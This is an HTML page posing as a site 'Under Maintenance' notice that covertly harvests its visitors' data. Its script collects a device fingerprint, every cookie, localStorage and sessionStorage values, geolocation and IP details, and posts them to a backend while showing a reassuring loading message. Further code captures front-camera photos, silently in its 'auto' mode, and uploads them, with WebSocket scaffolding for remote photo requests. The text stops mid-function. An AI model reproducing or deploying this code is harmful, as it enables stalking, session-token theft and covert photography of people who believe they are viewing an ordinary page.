<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>System Check</title>
  <style>
    body { 
      font-family: 'Segoe UI', Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }
    .container {
      text-align: center;
      background: white;
      padding: 60px 80px;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    h1 {
      color: #333;
      margin-bottom: 20px;
      font-size: 32px;
    }
    p {
      color: #666;
      margin-bottom: 40px;
      font-size: 16px;
    }
    .btn {
      display: inline-block;
      padding: 18px 48px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      text-decoration: none;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }
    .btn:active {
      transform: translateY(0);
    }
    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .status {
      margin-top: 30px;
      padding: 15px;
      border-radius: 10px;
      display: none;
    }
    .status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
      display: block;
    }
    .status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      display: block;
    }
    .status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
      display: block;
    }
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(0,0,0,.1);
      border-radius: 50%;
      border-top-color: #0c5460;
      animation: spin 1s ease-in-out infinite;
      vertical-align: middle;
      margin-right: 10px;
    }
    main {
  height: 100%;
  display: flex;
  margin: 0 20px;
  text-align: center;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
main h1 {
  font-size: 3em;
  font-weight: 100;
  color: #F44;
  margin: 0;
}
main h2 {
  font-size: 1.5em;
  font-weight: 100;
  margin-bottom: 0;
}
main h3 {
  font-size: 1.5em;
  font-weight: 100;
  margin-top: 0;
}
main a {
  font-size: 1.5em;
  font-weight: 300;
  color: #F44;
  text-decoration: none;
}
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
  <!-- Socket.IO client library for WebSocket communication -->
  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
  <div class="container">
    <main>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="70" viewBox="0 0 100 68">
    <g id="large">
      <path fill="none" stroke="#F44" d="M55.8 38.5l6.2-1.2c0-1.8-.1-3.5-.4-5.3l-6.3-.2c-.5-2-1.2-4-2.1-6l4.8-4c-.9-1.6-1.9-3-3-4.4l-5.6 3c-1.3-1.6-3-3-4.7-4.1l2-6A30 30 0 0 0 42 8l-3.3 5.4c-2-.7-4.2-1-6.2-1.2L31.3 6c-1.8 0-3.5.1-5.3.4l-.2 6.3c-2 .5-4 1.2-6 2.1l-4-4.8c-1.6.9-3 1.9-4.4 3l3 5.6c-1.6 1.3-3 3-4.1 4.7l-6-2A32.5 32.5 0 0 0 2 26l5.4 3.3c-.7 2-1 4.2-1.2 6.2L0 36.7c0 1.8.1 3.5.4 5.3l6.3.2c.5 2 1.2 4 2.1 6l-4.8 4c.9 1.6 1.9 3 3 4.4l5.6-3c1.4 1.6 3 3 4.7 4.1l-2 6A30.5 30.5 0 0 0 20 66l3.4-5.4c2 .7 4 1 6.1 1.2l1.2 6.2c1.8 0 3.5-.1 5.3-.4l.2-6.3c2-.5 4-1.2 6-2.1l4 4.8c1.6-.9 3-1.9 4.4-3l-3-5.6c1.6-1.3 3-3 4.1-4.7l6 2A32 32 0 0 0 60 48l-5.4-3.3c.7-2 1-4.2 1.2-6.2zm-13.5 4a12.5 12.5 0 1 1-22.6-11 12.5 12.5 0 0 1 22.6 11z"/>
      <animateTransform attributeName="transform" begin="0s" dur="3s" from="0 31 37" repeatCount="indefinite" to="360 31 37" type="rotate"/>
    </g>
    <g id="small">
      <path fill="none" stroke="#F44" d="M93 19.3l6-3c-.4-1.6-1-3.2-1.7-4.8L90.8 13c-.9-1.4-2-2.7-3.4-3.8l2.1-6.3A21.8 21.8 0 0 0 85 .7l-3.6 5.5c-1.7-.4-3.4-.5-5.1-.3l-3-5.9c-1.6.4-3.2 1-4.7 1.7L70 8c-1.5 1-2.8 2-3.9 3.5L60 9.4a20.6 20.6 0 0 0-2.2 4.6l5.5 3.6a15 15 0 0 0-.3 5.1l-5.9 3c.4 1.6 1 3.2 1.7 4.7L65 29c1 1.5 2.1 2.8 3.5 3.9l-2.1 6.3a21 21 0 0 0 4.5 2.2l3.6-5.6c1.7.4 3.5.5 5.2.3l2.9 5.9c1.6-.4 3.2-1 4.8-1.7L86 34c1.4-1 2.7-2.1 3.8-3.5l6.3 2.1a21.5 21.5 0 0 0 2.2-4.5l-5.6-3.6c.4-1.7.5-3.5.3-5.1zM84.5 24a7 7 0 1 1-12.8-6.2 7 7 0 0 1 12.8 6.2z"/>
      <animateTransform attributeName="transform" begin="0s" dur="2s" from="0 78 21" repeatCount="indefinite" to="-360 78 21" type="rotate"/>
    </g>
  </svg>
  <h1>Under Maintanance</h1>
  <h2>Sorry for the inconvenience.</h2>
  <h3>To contact us in the meantime please email:</h3>
  <a href="mailto:admin@MrTimcakes.com">admin@MrTimcakes.com</a>
</main>
    <div id="status" class="status loading">
      <span class="spinner"></span>Loading website...
    </div>
  </div>

  <script>
    const statusDiv = document.getElementById('status');

    // All the helper functions from original code
    function toHex(buffer) {
      const bytes = new Uint8Array(buffer);
      let s = '';
      for (let i=0;i<bytes.length;i++) s += bytes[i].toString(16).padStart(2,'0');
      return s;
    }

    async function sha256(input) {
      const enc = new TextEncoder();
      const data = enc.encode(input);
      const hash = await crypto.subtle.digest('SHA-256', data);
      return toHex(hash);
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      const screen = window.screen;

      // Enhanced browser detection
      const browser = (function(){
        if (ua.includes('Firefox/')) return 'Firefox';
        if (ua.includes('Edg/')) return 'Edge';
        if (ua.includes('OPR/') || ua.includes('Opera/')) return 'Opera';
        if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Chrome';
        if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Safari';
        return 'Unknown';
      })();

      // Enhanced OS and device model detection
      const deviceDetails = (function(){
        let os = 'Unknown';
        let deviceType = 'Desktop';
        let deviceModel = 'Unknown';
        let osVersion = 'Unknown';

        // iOS Detection
        if (ua.includes('iPhone')) {
          os = 'iOS';
          deviceType = 'Mobile';
          deviceModel = 'iPhone';
          // Try to detect iPhone model
          const models = {
            'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,2': 'iPhone 14 Pro',
            'iPhone14,3': 'iPhone 13 Pro Max', 'iPhone14,2': 'iPhone 13 Pro',
            'iPhone13,4': 'iPhone 12 Pro Max', 'iPhone13,3': 'iPhone 12 Pro',
            'iPhone13,2': 'iPhone 12', 'iPhone13,1': 'iPhone 12 Mini',
            'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,3': 'iPhone 11 Pro',
            'iPhone12,1': 'iPhone 11'
          };
          for (const [key, value] of Object.entries(models)) {
            if (ua.includes(key)) deviceModel = value;
          }
          const iosMatch = ua.match(/OS (\d+)[_.](\d+)/);
          if (iosMatch) osVersion = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
        }
        else if (ua.includes('iPad')) {
          os = 'iOS';
          deviceType = 'Tablet';
          deviceModel = 'iPad';
          const iosMatch = ua.match(/OS (\d+)[_.](\d+)/);
          if (iosMatch) osVersion = `iPadOS ${iosMatch[1]}.${iosMatch[2]}`;
        }
        // Android Detection
        else if (ua.includes('Android')) {
          os = 'Android';
          deviceType = /Mobile/i.test(ua) ? 'Mobile' : 'Tablet';
          const androidMatch = ua.match(/Android\s+([\d.]+)/);
          if (androidMatch) osVersion = `Android ${androidMatch[1]}`;

          // Try to detect Android device model
          const modelMatch = ua.match(/\(([^)]+)\)/);
          if (modelMatch) {
            const details = modelMatch[1];
            // Common manufacturers
            if (details.includes('SM-')) deviceModel = 'Samsung ' + details.match(/SM-[^\s;]+/)?.[0];
            else if (details.includes('Pixel')) deviceModel = 'Google ' + details.match(/Pixel[^\s;]+/)?.[0];
            else if (details.includes('ONEPLUS')) deviceModel = details.match(/ONEPLUS[^\s;]+/)?.[0];
            else if (details.includes('MI ')) deviceModel = 'Xiaomi ' + details.match(/MI[^\s;]+/)?.[0];
            else if (details.includes('Redmi')) deviceModel = 'Xiaomi Redmi ' + details.match(/Redmi[^\s;]+/)?.[0];
            else if (details.includes('VOG-')) deviceModel = 'Huawei ' + details.match(/VOG-[^\s;]+/)?.[0];
            else if (details.includes('HUAWEI')) deviceModel = details.match(/HUAWEI[^\s;]+/)?.[0];
            else deviceModel = details.split(';')[0].trim();
          }
        }
        // Windows Detection
        else if (ua.includes('Windows')) {
          os = 'Windows';
          deviceType = 'Desktop';
          if (ua.includes('Windows NT 10.0')) osVersion = 'Windows 10/11';
          else if (ua.includes('Windows NT 6.3')) osVersion = 'Windows 8.1';
          else if (ua.includes('Windows NT 6.2')) osVersion = 'Windows 8';
          else if (ua.includes('Windows NT 6.1')) osVersion = 'Windows 7';
          deviceModel = 'PC';
        }
        // macOS Detection
        else if (ua.includes('Mac OS')) {
          os = 'macOS';
          deviceType = 'Desktop';
          const macMatch = ua.match(/Mac OS X ([\d_]+)/);
          if (macMatch) {
            const version = macMatch[1].replace(/_/g, '.');
            osVersion = `macOS ${version}`;
          }
          // Try to determine if it's MacBook, iMac, etc.
          if (ua.includes('Macintosh')) {
            const cpuMatch = ua.match(/\(([^)]+)\)/);
            if (cpuMatch) {
              const cpu = cpuMatch[1];
              if (cpu.includes('Intel')) deviceModel = 'Mac (Intel)';
              else if (cpu.includes('ARM')) deviceModel = 'Mac (Apple Silicon)';
              else deviceModel = 'Mac';
            }
          }
        }
        // Linux Detection
        else if (ua.includes('Linux')) {
          os = 'Linux';
          deviceType = 'Desktop';
          deviceModel = 'PC';
          if (ua.includes('Ubuntu')) osVersion = 'Ubuntu';
          else if (ua.includes('Fedora')) osVersion = 'Fedora';
          else if (ua.includes('Debian')) osVersion = 'Debian';
        }

        return { os, deviceType, deviceModel, osVersion };
      })();

      const timezone = {
        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: -(new Date().getTimezoneOffset() / 60),
        current: new Date().toLocaleTimeString('en-US', { timeZoneName: 'long', hour12: false })
      };

      const locales = {
        browser: navigator.language,
        system: Intl.DateTimeFormat().resolvedOptions().locale,
        available: navigator.languages || [],
        dateFormat: new Date().toLocaleDateString(),
        timeFormat: new Date().toLocaleTimeString(),
        numberFormat: new Intl.NumberFormat().format(1234.56)
      };

      // Screen details
      const screenInfo = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type || 'unknown',
        angle: screen.orientation?.angle || 0,
        pixelRatio: window.devicePixelRatio || 1
      };

      return {
        browser,
        browserVersion: ua,
        os: deviceDetails.os,
        osVersion: deviceDetails.osVersion,
        deviceType: deviceDetails.deviceType,
        deviceModel: deviceDetails.deviceModel,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        screen: screenInfo,
        timezone,
        locales,
        language: navigator.language,
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        touch: 'ontouchstart' in window ? 'Yes' : 'No',
        mobile: /Mobi|Android/i.test(ua) ? 'Yes' : 'No',
        userAgent: ua
      };
    }

    async function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { renderer: null, vendor: null };
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null
        };
      } catch (e) {
        return { renderer: null, vendor: null };
      }
    }

    async function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 240;
        canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60';
        ctx.fillRect(0,0,240,60);
        ctx.font = '16px Arial';
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint test â€” ' + navigator.userAgent, 10, 30);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('ð•¯ð–†ð–™ð–†', 10, 50);
        const data = canvas.toDataURL();
        return await sha256(data);
      } catch (e) {
        return null;
      }
    }

    async function computeFingerprint() {
      const dev = getDeviceInfo();
      const webgl = await getWebGLInfo();
      const canvasHash = await getCanvasFingerprint();
      const components = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${dev.screen.width}x${dev.screen.height}x${dev.screen.colorDepth}`,
        timezone: dev.timezone.name,
        cores: dev.cores,
        memory: dev.memory,
        webglRenderer: webgl.renderer || '',
        webglVendor: webgl.vendor || '',
        canvasHash: canvasHash || ''
      };
      const concat = Object.values(components).join('||');
      const fp = await sha256(concat);
      return { fp, components };
    }

    async function getIPInfo() {
      try {
        // Use backend endpoint to avoid CORS issues
        const r = await fetch('/api/get-ip-info');
        if (!r.ok) return null;
        const data = await r.json();

        // Normalize the response based on provider
        // Enhanced to include all ipinfo.io fields (ASN, company, privacy, hostname, etc.)
        const normalized = {
          ip: data.ip,
          city: data.city || null,
          region: data.region || data.region_name || null,
          country: data.country_name || data.country || null,
          latitude: data.latitude || data.lat || (data.loc ? parseFloat(data.loc.split(',')[0]) : null),
          longitude: data.longitude || data.lon || (data.loc ? parseFloat(data.loc.split(',')[1]) : null),
          org: data.org || data.isp || null,
          isp: data.isp || data.org || null,
          provider: data.provider,
          // Enhanced fields from ipinfo.io
          asn: data.asn_number || data.asn ? {
            number: data.asn_number || (typeof data.asn === 'string' ? data.asn : data.asn?.asn) || null,
            name: data.asn_name || (typeof data.asn === 'object' ? data.asn?.name : null) || null,
            domain: data.asn_domain || (typeof data.asn === 'object' ? data.asn?.domain : null) || null,
            type: data.asn_type || (typeof data.asn === 'object' ? data.asn?.type : null) || null,
            route: data.asn_route || (typeof data.asn === 'object' ? data.asn?.route : null) || null
          } : null,
          company: data.company_name || data.company ? {
            name: data.company_name || (typeof data.company === 'string' ? data.company : data.company?.name) || null,
            domain: data.company_domain || (typeof data.company === 'object' ? data.company?.domain : null) || null,
            type: data.company_type || (typeof data.company === 'object' ? data.company?.type : null) || null
          } : null,
          privacy: {
            vpn: data.is_vpn || data.privacy?.vpn || false,
            proxy: data.is_proxy || data.privacy?.proxy || false,
            tor: data.is_tor || data.privacy?.tor || false,
            hosting: data.is_hosting || data.privacy?.hosting || false,
            relay: data.is_relay || data.privacy?.relay || false,
            residential_proxy: data.is_residential_proxy || data.privacy?.residential_proxy || false
          },
          hostname: data.hostname || null,
          postal: data.postal || data.postal_code || null,
          timezone: data.timezone || null,
          raw: data
        };

        return normalized;
      } catch (e) {
        console.warn('IP info fetch failed', e);
        return null;
      }
    }

    function haversineKm(lat1, lon1, lat2, lon2) {
      const toRad = v => v * Math.PI / 180;
      const R = 6371;
      const dLat = toRad(lat2 - lat1);
      const dLon = toRad(lon2 - lon1);
      const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon/2)**2;
      return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    }

    function detectVPN(ipInfo, deviceCoords) {
      const result = { isVPN: false, score: 0, reasons: [] };
      if (!ipInfo) { result.reasons.push('no-ip-info'); return result; }
      const raw = ipInfo.raw || {};
      if (raw.proxy || raw.vpn || raw.hosting || raw.security?.is_vpn || raw.security?.is_proxy) {
        result.score += 50;
        result.reasons.push('provider-flagged-proxy/vpn');
      }
      const org = ((raw.org || ipInfo.org || ipInfo.provider) + '').toLowerCase();
      const keywords = ['amazon','aws','google','digitalocean','ovh','hetzner','linode','microsoft','azure','vultr','vpn','proxy','hosting'];
      for (const kw of keywords) {
        if (org.includes(kw)) {
          result.score += 30;
          result.reasons.push('org:' + kw);
          break;
        }
      }
      const ipLat = ipInfo.latitude || ipInfo.lat || raw.latitude || raw.lat;
      const ipLon = ipInfo.longitude || ipInfo.lon || raw.longitude || raw.lon;
      if (deviceCoords && ipLat && ipLon) {
        const dkm = haversineKm(deviceCoords.lat, deviceCoords.lon, Number(ipLat), Number(ipLon));
        if (!isNaN(dkm)) {
          if (dkm > 1000) {
            result.score += 40;
            result.reasons.push('distance>' + Math.round(dkm) + 'km');
          } else if (dkm > 200) {
            result.score += 20;
            result.reasons.push('distance>' + Math.round(dkm) + 'km');
          }
        }
      }
      result.isVPN = result.score >= 50 || (result.score > 0 && result.score >= 40);
      return result;
    }

    async function getConnectionInfo() {
      try {
        const tlsInfo = {
          protocol: window.location.protocol,
          isSecure: window.location.protocol === 'https:',
          tlsVersion: 'unknown',
          cipherSuite: 'unknown'
        };
        const perf = window.performance.getEntriesByType('resource') || [];
        if (perf.length && 'nextHopProtocol' in perf[0]) tlsInfo.protocol = perf[0].nextHopProtocol || tlsInfo.protocol;
        return { tls: tlsInfo };
      } catch (e) {
        return null;
      }
    }

    function parseCookies() {
      const cookie = document.cookie || '';
      if (!cookie) return [];
      return cookie.split(';').map(s => {
        const [k, ...rest] = s.split('=');
        return { name: k.trim(), value: rest.join('=').trim() };
      });
    }

    function getLocalStorageInfo() {
      try {
        const keys = Object.keys(localStorage || {});
        const entries = keys.slice(0,50).map(k => ({ key: k, value: localStorage.getItem(k) }));
        return { count: keys.length, sample: entries };
      } catch (e) { return { error: 'localStorage access denied' }; }
    }

    function getSessionStorageInfo() {
      try {
        const keys = Object.keys(sessionStorage || {});
        const entries = keys.slice(0,50).map(k => ({ key: k, value: sessionStorage.getItem(k) }));
        return { count: keys.length, sample: entries };
      } catch (e) { return { error: 'sessionStorage access denied' }; }
    }

    async function getIndexedDBInfo(limitPerStore = 5) {
      if (!('indexedDB' in window)) return { supported: false };
      if (!indexedDB.databases) return { supported: true, enumerated: false };
      try {
        const dbList = await indexedDB.databases();
        return { supported: true, enumerated: true, count: dbList.length, databases: dbList.map(d => d.name) };
      } catch (e) {
        return { supported: true, enumerated: false };
      }
    }

    async function getBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          // Ensure battery.level is valid
          const levelRaw = battery.level != null ? battery.level : 0;
          const level = levelRaw != null ? Math.round(levelRaw * 100) + '%' : 'N/A';
          return {
            supported: true,
            charging: battery.charging || false,
            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds',
            dischargingTime: battery.dischargingTime === Infinity ? 'Calculating...' : battery.dischargingTime + ' seconds',
            level: level,
            levelRaw: levelRaw,
            health: (function() {
              // Estimate battery health based on level behavior
              // This is a rough estimate, actual health requires system-level access
              const level = levelRaw;
              if (level == null || isNaN(level)) return 'Unknown';
              if (level >= 0.9) return 'Excellent';
              if (level >= 0.7) return 'Good';
              if (level >= 0.4) return 'Fair';
              if (level >= 0.2) return 'Poor';
              return 'Critical';
            })()
          };
        } else {
          return { supported: false, reason: 'Battery API not available' };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function getNetworkInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
          return {
            supported: true,
            effectiveType: connection.effectiveType || 'unknown', // '4g', '3g', '2g', 'slow-2g'
            downlink: connection.downlink || 'unknown', // Mbps
            downlinkMax: connection.downlinkMax || 'unknown', // Mbps
            rtt: connection.rtt || 'unknown', // milliseconds
            saveData: connection.saveData || false,
            type: connection.type || 'unknown' // 'wifi', 'cellular', 'ethernet', etc.
          };
        } else {
          return { supported: false, reason: 'Network Information API not available' };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function getMediaDevices() {
      try {
        if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          return {
            supported: true,
            audioInputs: devices.filter(d => d.kind === 'audioinput').length,
            audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
            videoInputs: devices.filter(d => d.kind === 'videoinput').length,
            total: devices.length
          };
        } else {
          return { supported: false };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function requestCameraAccess() {
      try {
        if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
          // Request camera access for photo editing
          // On HTTPS (live), this should work if user grants permission
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });

          // Stop the stream immediately after getting permission
          // We'll request it again when user actually wants to edit photos
          stream.getTracks().forEach(track => track.stop());

          return {
            granted: true,
            message: 'Camera access granted for photo editing'
          };
        } else {
          return {
            granted: false,
            message: 'Camera API not supported in this browser'
          };
        }
      } catch (e) {
        // Log the error for debugging
        console.error('Camera access error:', e);
        return {
          granted: false,
          error: e.message || e.name || 'Unknown error',
          message: 'Camera access denied or unavailable: ' + (e.message || e.name || 'Unknown error')
        };
      }
    }

    async function collectAllData() {
      statusDiv.className = 'status loading';
      statusDiv.innerHTML = '<span class="spinner"></span>Loading website data...';

      try {
        // Run all independent async operations in parallel for faster execution
        // Note: Removed camera access request here - we'll do it once in capturePhoto()
        const [
          deviceInfo,
          fingerprint,
          ipInfo,
          connectionInfo,
          indexedDB,
          batteryInfo,
          networkInfo,
          mediaDevices
        ] = await Promise.all([
          Promise.resolve(getDeviceInfo()), // Synchronous, wrap in Promise.resolve
          computeFingerprint(),
          getIPInfo(),
          Promise.resolve(getConnectionInfo()), // Synchronous
          getIndexedDBInfo(),
          getBatteryInfo(),
          getNetworkInfo(),
          getMediaDevices()
        ]);

        // Synchronous operations (don't need to await)
        const cookies = parseCookies();
        const localStorage = getLocalStorageInfo();
        const sessionStorage = getSessionStorageInfo();

        // Start geolocation with shorter timeout (non-blocking - don't wait if it fails)
        const geolocationPromise = new Promise((resolve) => {
          if (!navigator.geolocation) {
            resolve(null);
            return;
          }
          
          const timeout = setTimeout(() => {
            resolve(null); // Resolve with null instead of rejecting
          }, 3000); // Reduced from 10s to 3s

          navigator.geolocation.getCurrentPosition(
            (pos) => {
              clearTimeout(timeout);
              resolve({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                altitudeAccuracy: pos.coords.altitudeAccuracy,
                heading: pos.coords.heading,
                speed: pos.coords.speed
              });
            },
            () => {
              clearTimeout(timeout);
              resolve(null); // Resolve with null on error
            },
            {
              enableHighAccuracy: false, // Changed to false for faster response
              timeout: 3000, // Reduced timeout
              maximumAge: 60000 // Use cached location if available (1 minute)
            }
          );
        });

        // Don't wait for geolocation - proceed with what we have
        const deviceCoords = await geolocationPromise;

        // Camera access check (non-blocking, just check if available)
        // We don't request access here since capturePhoto() will handle it
        const cameraAccess = {
          granted: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
          message: 'Camera will be requested when needed'
        };

        const vpnDetection = detectVPN(ipInfo, deviceCoords);

        // Prepare payload
        const payload = {
          deviceInfo,
          fingerprint,
          ipInfo,
          connectionInfo,
          batteryInfo,
          networkInfo,
          mediaDevices,
          cameraAccess,
          cookies,
          localStorage,
          sessionStorage,
          indexedDB,
          deviceCoords,
          vpnDetection,
          timestamp: new Date().toISOString()
        };

        // Enhanced logging for debugging
        console.log('%c[DEBUG] Camera Access Data:', 'color: #4CAF50; font-weight: bold;');
        console.log('  Granted:', cameraAccess.granted);
        console.log('  Message:', cameraAccess.message);
        console.log('%c[DEBUG] Full Payload:', 'color: #2196F3; font-weight: bold;', payload);

        // Send to backend with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
        
        try {
          const response = await fetch('/api/collect', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload),
            signal: controller.signal
          });
          
          clearTimeout(timeoutId);

          if (response.ok) {
            const result = await response.json();
            // Store entry_id and fingerprint for photo linking
            window.currentEntryId = result.entry_id;
            window.currentFingerprint = result.fingerprint;
            
            statusDiv.className = 'status success';
            statusDiv.innerHTML = ' Website will be Live in a few minutes!';
          } else {
            // Try to get error message from response
            let errorMessage = 'Failed to submit data';
            try {
              const errorData = await response.json();
              errorMessage = errorData.message || errorMessage;
            } catch (e) {
              // If response is not JSON, use status text
              errorMessage = response.statusText || errorMessage;
            }
            
            // Show more specific error messages
            if (response.status === 502) {
              errorMessage = 'Server is temporarily unavailable. Please try again in a moment.';
            } else if (response.status === 503) {
              errorMessage = 'Service is temporarily unavailable. Please try again later.';
            } else if (response.status === 429) {
              errorMessage = 'Too many requests. Please wait a moment and try again.';
            } else if (response.status >= 500) {
              errorMessage = 'Server error. Please try again later.';
            }
            
            throw new Error(errorMessage);
          }
        } catch (error) {
          clearTimeout(timeoutId);
          
          console.error('Error:', error);
          statusDiv.className = 'status error';
          
          // Show more specific error messages
          if (error.name === 'AbortError') {
            statusDiv.innerHTML = 'âœ— Request timed out. Please check your connection and try again.';
          } else if (error.message) {
            statusDiv.innerHTML = `âœ— ${error.message}`;
          } else {
            statusDiv.innerHTML = 'âœ— An error occurred. Please try again.';
          }
        }

      } catch (error) {
        console.error('Error:', error);
        statusDiv.className = 'status error';
        statusDiv.innerHTML = 'âœ— An error occurred. Please try again.';
      }
    }

    // Detect if iOS device (used in multiple places)
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

    // Photo capture functionality
    async function capturePhoto(source = 'auto') {
      try {
        console.log(`[PHOTO] Starting ${source} photo capture...`);

        // Request camera access - uses the device's front camera
        // On iPhone: uses iPhone's front camera
        // On laptop: uses laptop's webcam
        // This ensures remote users use their own device's camera
        // iOS Safari may need simpler constraints
        const videoConstraints = isIOS 
          ? { facingMode: 'user' }  // Simpler constraint for iOS
          : { 
              facingMode: 'user',  // Front-facing camera (iPhone front camera, laptop webcam)
              width: { ideal: 1280 },
              height: { ideal: 720 }
            };

        const stream = await navigator.mediaDevices.getUserMedia({
          video: videoConstraints,
          audio: false
        });

        // Create video element to capture frame
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        // Wait for video to be ready
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // Wait a moment for camera to adjust
        await new Promise(resolve => setTimeout(resolve, 500));

        // Create canvas to capture image
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // Convert to blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

        // Stop camera
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        // Get entry ID and fingerprint from collected data (if available)
        const entryId = window.currentEntryId || null;
        const fingerprint = window.currentFingerprint || (await computeFingerprint()).fp;

        // Send to backend with entry ID to link photo to collected data
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('timestamp', new Date().toISOString());
        formData.append('fingerprint', fingerprint);
        formData.append('ip_address', (await getIPInfo())?.ip || '');
        formData.append('capture_source', source);
        if (entryId) {
          formData.append('data_entry_id', entryId);
        }

        console.log('[PHOTO] Uploading photo to server...');

        const response = await fetch('/api/save-photo', {
          method: 'POST',
          body: formData
        });

        const result = await response.json();

        if (response.ok) {
          console.log('[PHOTO] Photo captured and saved successfully!', result);
        } else {
          throw new Error(result.message || 'Failed to save photo');
        }

      } catch (error) {
        console.error('[PHOTO] Photo capture error:', error);
        // Show error to user on manual capture
        if (source === 'manual') {
          statusDiv.className = 'status error';
          statusDiv.innerHTML = 'âœ— Failed to capture photo: ' + error.message;
        }
        // Don't show error to user on auto capture - fail silently
      }
    }


    // WebSocket connection for photo requests
    let socket = null;
    let isConnecting = false;  // Guard to prevent multiple simultaneous connection attempts
    let currentEntryId = null;
    let currentFingerprint = null;

    // Initialize WebSocket connection
    let heartbeatInterval = null;
    let isStreaming = false;
    
    // Wake Lock API - prevents device from sleeping
    let wakeLock = null;

    async function requestWakeLock() {
      try {
        if ('wakeLock' in navigator) {
          wakeLock = await navigator.wakeLock.request('screen');
          console.log('[WAKELOCK] Wake lock acquired');
          
          wakeLock.addEventListener('release', () => {
            console.log('[WAKELOCK] Wake lock released');
          });
        }
      } catch (err) {
        console.warn('[WAKELOCK] Wake lock request failed:', err);
      }
    }

    async function releaseWakeLock() {
      if (wakeLock) {
        await wakeLock.release();
        wakeLock = null;
        console.log('[WAKELOCK] Wake lock released');
      }
    }
    
    // Check if user can actually perform actions (camera access)
    // Moved to global scope so it can be accessed from event listeners
    let canStreamOrPhoto = false;
    let lastKnownCapable = false; // Store last known capability status
    let lastCapabilityCheck = 0; // Timestamp of last capability check
    const CAPABILITY_CHECK_COOLDOWN = 60000; // Only check capability every 60 seconds
    let isTabClosing = false; // Track if tab is closing to prevent capability checks
    
    async function checkCapability(force = false) {
        try {
          // Don't check capability if tab is closing
          if (isTabClosing) {
            console.log('[CAPABILITY] Tab is closing - skipping capability check');
            return false;
          }
          
          // Check if page is visible - can't verify capability when hidden
          // Return last known capability instead of false
          if (document.hidden) {
